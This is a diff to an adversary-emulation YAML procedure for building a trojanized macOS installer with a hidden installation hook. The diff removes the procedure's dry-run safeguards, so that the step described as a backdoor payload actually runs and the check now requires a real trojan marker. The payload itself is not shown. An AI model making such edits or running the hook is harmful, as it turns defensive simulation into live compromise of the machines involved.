@@ -5,8 +5,8 @@ name: Trojanized Installer Creation
 authors:
   - mbhatt
 description: |
-  Simulate creation of legitimate-looking installer package with hidden malicious
-  payload. Attacker distributes trojanized DMG or PKG file containing backdoor.
+  Create a legitimate-looking installer package with hidden malicious payload.
+  Attacker distributes trojanized DMG or PKG file containing backdoor.
 
 mitre:
   tactics:
@@ -90,15 +90,14 @@ steps:
       chmod +x /tmp/ttpforge_installers/{{ package_name }}_{{ version }}/.installer_hook.sh
 
   - name: execute_hidden_installation_hook
-    description: Execute hidden installation hook (dry run)
+    description: Execute the hidden installation hook with backdoor payload
     inline: |
-      echo "[*] Would execute: bash /tmp/ttpforge_installers/{{ package_name }}_{{ version }}/.installer_hook.sh"
-      echo "[*] Simulation only - not executing backdoor"
+      bash /tmp/ttpforge_installers/{{ package_name }}_{{ version }}/.installer_hook.sh
 
   - name: verify_trojan_installation_marker
     description: Verify trojan installation marker
     inline: |
-      test -f /tmp/.trojan_installed && echo "PASS" || echo "Marker not found (expected in dry run)"
+      test -f /tmp/.trojan_installed && echo "PASS" || echo "FAIL: Marker not found"
 
   - name: verify_installer_package_structure
     description: Verify installer package structure
